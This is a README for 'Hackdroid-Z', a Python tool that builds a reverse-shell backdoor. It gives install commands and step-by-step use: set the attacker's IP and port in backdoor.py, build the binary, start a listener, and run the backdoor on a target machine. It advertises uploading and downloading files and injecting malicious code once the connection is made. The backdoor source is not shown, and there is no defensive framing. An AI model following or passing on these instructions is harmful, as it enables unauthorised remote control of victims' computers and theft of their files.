![hackdroidz](https://img.shields.io/badge/tool-hackdroidZ-brightgreen?style=for-the-badge&logo=github)

![Hackdroid-Z](https://miro.medium.com/max/3840/1*4VtMoJ2jGvuJB26NRaL59g.jpeg)

# ABOUT THIS TOOL :
Hackdroid-Z is a python based script or tool which made for creating a reverse shell. It will help you to create a reverse shell in less time. You can also inject malicious code ones you get a reverse connection. Also you can upload and download files from your target computer through reverse shell.

# INSTALLATION :
- `git clone https://github.com/BurpOverflow/Hackdroid-Z.git`
- `cd Hackdroid-Z`
- `pip3 install -r requirements.txt`

# USAGE OPTIONS [Linux] :
- `-h` Show Help Menu
- `-H` Specify Your Host IP Address
- `-p` Specify Listening Port

# CUSTOM SHELL COMMAND : 
### 1. DOWNLOAD FILE : 
- You can download file using `download filename`
### 2. UPLOAD FILE : 
- You can upload file using `upload filename`

# HOW TO USE : 

### EDIT BACKDOOR.PY : 
- Open backdoor.py using `vim` or `nano`
- Specify `SERVER_IP` and `SERVER_PORT` , Then save this file.

![BACKDOOR.PY](https://miro.medium.com/max/2127/1*C2sd2SfbeWHzX60jIivxaw.png)

### BUILD YOUR BACKDOOR : 
- Type `python3 build.py` on your terminal.
- Then you will findout you backdoor in `dist` directory.
![backdoor](https://miro.medium.com/max/2127/1*NGxTdHqj2CrDAIkLbXWgKA.png)

### START YOUR SERVER : 
- Type `python3 -H 192.168.43.123 -p 5050`
- `-H` specify your host IP
- `-p` specify listening port
![img](https://miro.medium.com/max/2076/1*6bmWB42nDi3Yz9--rH1rXA.png)

### EXECUTE BACKDOOR IN YOUR TARGET MACHINE : 
- type `./backdoor` on trminal to execute it.
![execute](https://miro.medium.com/max/2127/1*MZrJFvpLBN38bjaYb0Gocg.png)

### REVERSE SHELL : 
- Now you got a reverse shell.
- You can type any command you want
![shell](https://miro.medium.com/max/2076/1*KU3PxN-jzazuviBDjQdvAg.png)

## CONTACT ME : 
- Twitter: [@burpOverflow](https://twitter.com/BurpOverflow/)
- Join Discord: [BurpOverflow](https://discord.gg/UWU8NKmayp)
- Sub Reddit: [Sub Reddit](https://www.reddit.com/r/burpOverflow/)

